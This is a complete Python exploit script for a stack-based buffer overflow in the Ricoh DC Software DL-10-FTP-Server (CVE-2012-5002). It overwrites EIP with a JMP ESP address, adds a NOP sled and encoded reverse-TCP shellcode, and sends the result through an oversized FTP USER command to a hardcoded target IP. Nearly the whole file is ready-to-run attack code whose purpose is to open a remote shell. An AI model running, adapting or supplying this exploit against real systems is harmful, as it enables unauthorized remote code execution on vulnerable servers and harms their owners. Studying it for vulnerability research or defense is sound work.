#!/usr/bin/env python3

# Trivial Stack-based Buffer Overflow Exploit for Ricoh DC Software DL-10-FTP-Server SR10
# CVE-2012-5002
# JM5

import struct
import socket
import sys

target = "172.16.25.140"
port = 21

junk = b"\x41" * 245
eip = struct.pack("<L", 0x77FB8BAB)  # JMP ESP opcode 'FFE4' [ntdll.dll module]
nops = b"\x90" * 20

# reverse tcp
shellcode = (
    b"\xb8\xb6\x7b\x25\x9e\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9"
    b"\xb1\x59\x31\x46\x14\x03\x46\x14\x83\xc6\x04\x54\x8e\xd9"
    b"\x76\x17\x71\x22\x87\x47\xfb\xc7\xb6\x55\x9f\x8c\xeb\x69"
    b"\xeb\xc1\x07\x02\xb9\xf1\x9c\x66\x16\xf5\x15\xcc\x40\x38"
    b"\xa5\xe1\x4c\x96\x65\x60\x31\xe5\xb9\x42\x08\x26\xcc\x83"
    b"\x4d\xf0\xba\x6c\x03\x88\x17\x62\xf3\x05\xd5\xbe\xfa\xc9"
    b"\x51\xfe\x84\x6c\xa5\x8a\x38\x6e\xf6\xf9\x89\x68\xa6\x76"
    b"\x51\xa9\x47\x5b\xe7\x60\x33\x67\xd9\x8d\xf5\x1c\x2d\xf9"
    b"\x07\xf4\x7f\x3d\xab\x39\xb0\xb0\xb5\x7e\x77\x2b\xc0\x74"
    b"\x8b\xd6\xd3\x4f\xf1\x0c\x51\x4f\x51\xc6\xc1\xab\x63\x0b"
    b"\x97\x38\x6f\xe0\xd3\x66\x6c\xf7\x30\x1d\x88\x7c\xb7\xf1"
    b"\x18\xc6\x9c\xd5\x41\x9c\xbd\x4c\x2c\x73\xc1\x8e\x88\x2c"
    b"\x67\xc5\x3b\x3a\x17\x26\xc4\x43\x45\xb0\x08\x8e\x76\x40"
    b"\x07\x99\x05\x72\x88\x31\x82\x3e\x41\x9c\x55\x37\x45\x1f"
    b"\x89\xff\x06\xe1\x2a\xff\x0f\x26\x7e\xaf\x27\x8f\xff\x24"
    b"\xb8\x30\x2a\xd0\xb2\xa6\x79\x34\xda\xb3\xea\x36\xdc\xbc"
    b"\x0e\xbf\x3a\x92\x9e\xef\x92\x53\x4f\x4f\x43\x3c\x85\x40"
    b"\xbc\x5c\xa6\x8b\xd5\xf7\x49\x65\x8d\x6f\xf3\x2c\x45\x11"
    b"\xfc\xfb\x23\x11\x76\x09\xd3\xdc\x7f\x78\xc7\x09\x18\x82"
    b"\x17\xca\x8d\x82\x7d\xce\x07\xd5\xe9\xcc\x7e\x11\xb6\x2f"
    b"\x55\x22\xb1\xd0\x28\x12\xc9\xe7\xbe\x1a\xa5\x07\x2f\x9a"
    b"\x35\x5e\x25\x9a\x5d\x06\x1d\xc9\x78\x49\x88\x7e\xd1\xdc"
    b"\x33\xd6\x85\x77\x5c\xd4\xf0\xb0\xc3\x27\xd7\xc2\x04\xd7"
    b"\xa5\xec\xac\xbf\x55\xad\x4c\x3f\x3c\x2d\x1d\x57\xcb\x02"
    b"\x92\x97\x34\x89\xfb\xbf\xbf\x5c\x49\x5e\xbf\x74\x0f\xfe"
    b"\xc0\x7b\x94\xf1\xbb\xf4\x2b\xf2\x3b\x1d\x48\xf3\x3b\x21"
    b"\x6e\xc8\xed\x18\x04\x0f\x2e\x1f\x17\x3a\x13\x36\xb2\x44"
    b"\x07\x48\x97"
)

# payload concatenation 
payload = junk + eip + nops + shellcode

print(f"[*] Connecting to Target {target}...")

# socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((target, port))
        print(f"[*] Connected to {target}!")
    except:
        print(f"[!] {target} didn't respond\n")
        sys.exit(0)

    s.recv(1024)
    print("[*] Sending malformed request...")
    s.sendall(f"USER {payload}\r\n".encode())

print("[!] Exploit has been sent!\n")
